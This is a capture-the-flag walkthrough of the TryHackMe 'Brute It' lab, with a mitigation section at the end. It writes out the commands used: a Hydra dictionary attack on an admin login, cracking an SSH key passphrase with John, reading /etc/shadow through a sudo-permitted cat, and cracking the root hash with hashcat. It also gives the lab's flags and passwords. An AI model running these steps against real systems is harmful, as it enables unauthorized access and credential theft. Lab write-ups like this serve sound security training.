# Brute It – TryHackMe

- Difficulty: easy
- Date: 2026-05-05
- Tags: brute force, hash cracking, privilege escalation, tryhackme, ctf

## 🧩 Overview

```text
Learn how to brute, hash cracking and escalate privileges in this box!
```

## ⚙️ Tools Used

- Nmap
- John The Ripper
- SSH2John
- [Hash Identifier](https://hashes.com/en/tools/hash_identifier)
- Hashcat

## Walkthrough

### Task 1 - About This Box

In this box, you will learn about:

- Brute-force
- Hash cracking
- Privilege escalation

Connect to the TryHackMe network, and deploy the machine.

### Task 2 - Reconnaissance

Before attacking, let's get information about the target:

```shell-session
nmap -sS -sV -O 10.112.160.198 -oN scan
```

#### Q1: Search for Open Ports Using Nmap. How Many Ports Are Open?

<div align="center"><img src="../attachments/Pasted image 20260505145741.png"/></div>

```text
-> The server has `2` open ports.
```

#### Q2: What Version of SSH is Running?

<div align="center"><img src="../attachments/Pasted image 20260505145843.png"/></div>

```text
-> The server is running `OpenSSH 7.6p1`.
```

#### Q3: What Version of Apache is Running?

<div align="center"><img src="../attachments/Pasted image 20260505145857.png"/></div>

```text
-> Apache is running version `2.4.29`.
```

#### Q4: Which Linux Distribution is Running?

<div align="center"><img src="../attachments/Pasted image 20260505150433.png"/></div>

```text
-> The server is running `Ubuntu`.
```

#### Q5: Search for Hidden Directories on Web Server. What is the Hidden Directory?

To discover hidden directories, I used `gobuster` with the `common.txt` wordlist:

```shell-session
gobuster dir -u http://10.112.160.198 -w /usr/share/wordlists/dirb/common.txt -r
```

<div align="center"><img src="../attachments/Pasted image 20260505150812.png"/></div>

```text
-> The hidden directory is `/admin`.
```

### Task 3 - Getting a Shell

Find a form to get a shell on SSH.

#### Q1: What is the user:password of the Admin Panel?

I started by visiting the web page and inspecting its source code.
There was a comment referencing the **admin** user.

<div align="center"><img src="../attachments/Pasted image 20260505151209.png"/></div>

Next, I used **Burp Suite** to intercept the HTTP request and capture the request body.

<div align="center"><img src="../attachments/Pasted image 20260505152020.png"/></div>

To prepare for brute-forcing, I submitted a random password to identify the failure message. Then, I used Hydra to perform a dictionary attack:

```shell-session
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.112.160.198 http-post-form "/admin/:user=^USER^&pass=^PASS^:F=invalid"
```

<div align="center"><img src="../attachments/Pasted image 20260505153948.png"/></div>

```text
-> The user:password of the admin panel is `admin:xavier`.
```

#### Q2: Crack the RSA Key You Found. What is John's RSA Private Key Passphrase?

I've logged in using the admin credentials and downloaded the RSA key.

<div align="center"><img src="../attachments/Pasted image 20260505155353.png"/></div>

<div align="center"><img src="../attachments/Pasted image 20260505154255.png"/></div>

To crack it, I first converted the key into a format readable by John using the
**ssh2john** tool.

<div align="center"><img src="../attachments/Pasted image 20260505154637.png"/></div>

Then, I ran **John the Ripper** with the **rockyou.txt** wordlist:

```shell-session
john --wordlist=/usr/share/wordlists/rockyou.txt john_key
```

<div align="center"><img src="../attachments/Pasted image 20260505154836.png"/></div>

```text
-> John's RSA Private Key passphrase is `rockinroll`.
```

#### Q3: user.txt

With the passphrase cracked, I used the private key to SSH into the machine.
SSH is running on port 22 of the target machine.

First, I set the correct permissions:

```shell-session
chmod 600 key.pem # Only the user can read and execute it.
```

Then I connected as the `john` (seen in the comments of the web page and on the admin cpanel):

<div align="center"><img src="../attachments/Pasted image 20260505155302.png"/></div>

I was able to SSH as john.
After authenticating as `john`, I located `user.txt` in the home directory.

<div align="center"><img src="../attachments/Pasted image 20260505155504.png"/></div>

#### Q4: Web Flag

<div align="center"><img src="../attachments/Pasted image 20260505154417.png"/></div>

The web flag is shown after logging in as **admin**.

```text
THM{brut3_f0rce_is_e4sy}
```

### Task 4 - Privilege Escalation

#### Q1: Find a Form to Escalate Your Privileges. What is the Root's Password?

I began by checking which commands the `john` user could run as root by running `sudo -l`.

<div align="center"><img src="../attachments/Pasted image 20260505155748.png"/></div>

It turns out that `cat` can be executed as root without a password.

This means that we can read the `/etc/shadow` file, where password hashes are stored:

<div align="center"><img src="../attachments/Pasted image 20260505161143.png"/></div>

I've copied the root hash into a new file `hash.txt`:

```shell-session
echo 'root:$6$zdk0.jUm$Vya24cGzM1duJkwM5b17Q205xDJ47LOAg/OpZvJ1gKbLF8PJBdKJA4a6M.JYPUTAaWu4infDjI88U9yUXEVgL.' > hash.txt
```

This is a Linux password hash and it uses the sha512crypt hashing algorithm, which I confirmed using [this hash identifier tool](https://hashes.com/en/tools/hash_identifier)

<div align="center"><img src="../attachments/Pasted image 20260505161929.png"/></div>

Next, I identified the correct `Hashcat` mode:

```shell-session
hashcat --help | grep sha512`
```

<div align="center"><img src="../attachments/Screenshot 2026-05-05 162017.png"/></div>

The SHA512crypt format corresponds to Hashcat mode `1800`.

I then cracked the hash:

```shell-session
hashcat -m 1800 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
```

`Hashcat` was able to crack the password:

<div align="center"><img src="../attachments/Pasted image 20260505162147.png"/></div>

```text
-> The root's password is football
```

#### Q2: root.txt

Finally, I retrieved the root flag:

```shell-session
sudo cat /root/root.txt
```

<div align="center"><img src="../attachments/Pasted image 20260505161030.png"/></div>

```text
-> THM{pr1v1l3g3_3sc4l4t10n}
```

## 🚩 Flag

```
THM{pr1v1l3g3_3sc4l4t10n}
```

## 🧠 Lessons Learned

- Weak credentials are highly vulnerable to brute-force attacks
- Misconfigured sudo permissions can lead to full system compromise
- Password hashes can often be cracked quickly with common wordlists
- Always enumerate thoroughly before attempting escalation

## 🛡️ Mitigation

- Don't expose credentials in the page source code
- Enforce strong password policies
- Implement account lockouts or rate limiting
- Restrict sudo permissions using the principle of least privilege
- Protect sensitive files like `/etc/shadow`
- Use key-based authentication with strong passphrases
